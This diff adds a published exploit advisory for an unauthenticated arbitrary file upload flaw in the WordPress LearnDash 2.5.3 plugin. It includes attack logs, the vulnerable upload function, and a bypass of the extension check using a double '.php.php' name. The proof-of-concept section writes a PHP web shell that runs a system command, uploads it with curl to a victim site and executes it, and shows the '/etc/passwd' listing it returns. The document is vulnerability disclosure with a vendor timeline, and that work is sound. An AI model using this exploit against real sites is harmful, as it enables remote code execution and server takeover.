@@ -1,0 +1,79 @@
+# Exploit Title: WordPress LearnDash 2.5.3 Unauthenticated Arbitrary 
+File Upload
+# Date: 07-01-2018
+# Vendor Homepage: https://www.learndash.com/
+# Vendor Changelog: https://www.learndash.com/changelog/
+# Version: 2.5.3
+# Exploit Author: NinTechNet
+# Author Advisory: http://nin.link/learndash/
+# Category: Webapps
+
+1. Overview:
+
+This vulnerability has been exploited at least since Dec. 27th, 2017. 
+Here's a log sample showing the attack:
+87.244.138.44 - - [27/Dec/2017:20:29:33 +0100] "POST / HTTP/1.0" 200 
+47095
+87.244.138.44 - - [27/Dec/2017:20:29:34 +0100] "GET 
+/wp-content/uploads/assignments/assig.php. HTTP/1.1" 200 266
+87.244.138.44 - - [27/Dec/2017:20:29:36 +0100] "GET 
+/wp-admin/ms-site.php HTTP/1.1" 200 4110
+
+2. Description:
+
+The plugin offers the possibility to create courses and to assign 
+lessons to them. Each lesson can allow uploads, and it is possible to 
+restrict them by file extensions. Uploads are handled by the 
+learndash_assignment_process_init() function located in the 
+"wp-content/plugins/sfwd-lms/includes/ld-assignment-uploads.php" script:
+
+// ===================================================================
+function learndash_assignment_process_init() {
+
+    if ( isset( $_POST['uploadfile'] ) && isset( $_POST['post'] ) ) {
+       $post_id = $_POST['post'];
+       $file = $_FILES['uploadfiles'];
+
+       if (( ! empty( $file['name'][0] ) ) && ( learndash_check_upload( 
+$file, $post_id ) ) )  {
+          $file_desc = learndash_fileupload_process( $file, $post_id );
+          $file_name = $file_desc['filename'];
+          $file_link = $file_desc['filelink'];
+          $params = array(
+             'filelink' => $file_link,
+             'filename' => $file_name,
+          );
+       }
+    }
+}
+// ===================================================================
+
+Neither this function nor the learndash_check_upload() and 
+learndash_fileupload_process() functions it calls check if the user is 
+authenticated or allowed to upload files, or even if the post ID, course 
+and lesson exist before accepting the file.
+
+The plugin calls the WordPress wp_check_filetype() API function, removes 
+the filename extension and appends the one returned by this function. 
+Because wp_check_filetype() will return an empty value for PHP scripts, 
+the file extension will be removed: "script.php" will become "script.". 
+But that can be bypassed by appending a double extension, e.g., 
+"script.php.php" which will be turned into "script.php.". Although the 
+PHP filename ends with a [.] dot, it is still executed by default by the 
+PHP interpreter on servers running Apache with PHP CGI/FastCGI SAPI.
+
+3. Proof of concept:
+
+To exploit the vulnerability, it is only required that the plugin be 
+enabled, even if no courses or lessons were created (bogus values can be 
+assigned to each variable):
+
+$ echo '<?php echo exec("ls -la /etc/passwd");' > shell.php.php
+$ curl -F "post=foobar" -F "course_id=foobar" -F "uploadfile=foobar" -F 
+"uploadfiles[]=@./shell.php.php" http://victim.tld/
+$ curl 'http://victim.tld/wp-content/uploads/assignments/shell.php.'
+-rw-r--r-- 1 root root 2385 Apr 14  2017 /etc/passwd
+
+4. Timeline:
+
+Authors were informed on January 2nd and released version 2.5.4 on January 3rd.
